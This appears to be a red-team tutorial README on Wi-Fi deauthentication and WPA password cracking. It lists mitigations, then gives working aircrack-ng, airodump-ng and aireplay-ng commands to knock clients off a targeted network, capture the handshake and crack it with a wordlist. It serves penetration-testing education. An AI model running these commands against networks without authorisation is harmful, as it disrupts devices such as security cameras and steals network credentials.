# Wi-Fi Deauthentication and Password Cracking Demo 

## Introduction  

Wi-Fi is a *wireless networking technology* that allows devices to connect to the internet or communicate with each other wirelessly within a certain range.  
One of the vulnerabilities in Wi-Fi networks is their susceptibility to deauthentication attacks:  
this type of attack is possible on various versions of Wi-Fi, including `WEP`, `WPA`, and `WPA2`.  

<br/>

A deauthentication attack involves sending specially crafted packets to a Wi-Fi access point, causing connected devices to disconnect.  
When devices attempt to reconnect, they perform a handshake, a process that establishes a secure connection by exchanging cryptographic keys.  
During this handshake, the essential data needed to authenticate the client is temporarily exposed:  
**If an attacker captures this handshake, they can use various tools to attempt to crack the Wi-Fi password**.  

<br/>

This is possible because the handshake contains enough information to verify passwords against the cryptographic exchange, allowing attackers to try different passwords until they find the correct one.  


Red teamers can leverage deauthentication attacks not only to capture handshakes for password cracking but also to perpetrate Denial-of-Service (DoS) attacks.  
For example, during a physical penetration test, they can disconnect wireless IP cameras or other Wi-Fi devices, potentially disrupting security measures or critical operations.  

To mitigate these attacks, several measures can be implemented:  
 
1. **Use Strong, Unique Passwords:**  Ensure that Wi-Fi passwords are complex and not easily guessable.
 
2. **Enable WPA3:**  The latest Wi-Fi security protocol, WPA3, offers enhanced protection against deauthentication attacks.  
 
3. **Implement MAC Address Filtering:**  Although not foolproof, this can add an additional layer of security by restricting access to known devices.  
 
4. **Use Network Segmentation:**  Separate critical devices and services onto different network segments to limit the impact of an attack and never connect critical devices via WiFi.  
 
5. **Monitor Network Traffic:**  Regularly monitor for unusual activity that might indicate a deauthentication attack.



## Instructions

### Alfa Adapter Setup 
Before performing any Wi-Fi deauthentication or password cracking activities, you need a compatible wireless adapter. 

I will use an "old" **Alfa AWUS036NHA**.  
[*Alfa*](https://alfa-network.eu/) adapters are a popular choice for this purpose due to their support for monitor mode and packet injection capabilities.  

1. **List USB Devices:** 
First, ensure your wireless adapter is recognized by the system:


```sh
lsusb
```

Look for the entry:


```console
Qualcomm Atheros Communications AR9271 802.11n
```
If this does not appear (particularly if you're working within a virtual machine), add the device via *VM -> Removable Devices*.  
 
2. **Install Necessary Drivers:** 
On a new Debian installation, you may need to install the appropriate drivers.  
Use the following commands to update your package list and install the driver:  


```sh
sudo apt update
sudo apt install realtek-rtl88xxau-dkms
```
**Note**: The `realtek-rtl88xxau-dkms` package is for Realtek chipsets.  
If using an Alfa AWUS036NHA with an Atheros chipset, the drivers should generally be included in the kernel.
 
3. **Verify Wireless Interface:** 
To check if the wireless interface is recognized, use:


```sh
sudo iwconfig
```

You should see an entry similar to:


```vbnet
lo        no wireless extensions.

eth0      no wireless extensions.

docker0   no wireless extensions.

wlan0     IEEE 802.11  ESSID:off/any  
          Mode:Managed  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Encryption key:off
          Power Management:off
```

Alternatively, you can list network interfaces with:


```sh
ip link show
```

### Deauthentication Attack 

Performing a deauthentication attack on a Wi-Fi network requires placing your wireless adapter into monitor mode and then using a series of tools from the `aircrack-ng` suite.
 
1. **Put Your Wireless Interface in Monitor Mode:** 
Switch your wireless interface to monitor mode to capture packets:


```sh
sudo airmon-ng start wlan0
```
This creates a new interface, typically named `wlan0mon`.
 
2. **Discover Wireless Networks:** Use `airodump-ng` to scan for available wireless networks:

```sh
sudo airodump-ng wlan0mon
```

Note the BSSID (MAC address) and channel of the target network.
 
3. **Capture Target Network Details:** 
Focus your capture on the target network to collect packets:


```sh
sudo airodump-ng --bssid <TARGET_BSSID> --channel <CHANNEL> --write <OUTPUT_FILE> wlan0mon
```
Replace `<TARGET_BSSID>`, `<CHANNEL>`, and `<OUTPUT_FILE>` with the appropriate values for your target.
 
4. **Perform the Deauthentication Attack:** 
Send deauthentication packets to disconnect clients from the target network:


```sh
sudo aireplay-ng --deauth <NUMBER_OF_DEAUTH_PACKETS> -a <TARGET_BSSID> -c <TARGET_CLIENT_MAC> wlan0mon
```
 
  - `<NUMBER_OF_DEAUTH_PACKETS>`: Number of deauth packets to send (0 for infinite).
 
  - `<TARGET_BSSID>`: BSSID of the target network.
 
  - `<TARGET_CLIENT_MAC>`: MAC address of the target client (optional for broadcasting to all clients).
 
5. **Crack the Password:** 
Once you have captured the necessary handshake packets, you can attempt to crack the Wi-Fi password:


```sh
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b <TARGET_BSSID> attack_capture-01.cap
```
 
  - `-w /usr/share/wordlists/rockyou.txt`: Path to the wordlist file.
 
  - `-b <TARGET_BSSID>`: BSSID of the target network.
 
  - `attack_capture-01.cap`: The file containing the captured handshake packets. 


The following video demonstrates the process of capturing a handshake and subsequently cracking the password from the captured packets:  



https://github.com/R3DRUN3/sploitcraft/assets/102741679/16497005-7909-48c2-af11-b84a2cb7bbdf

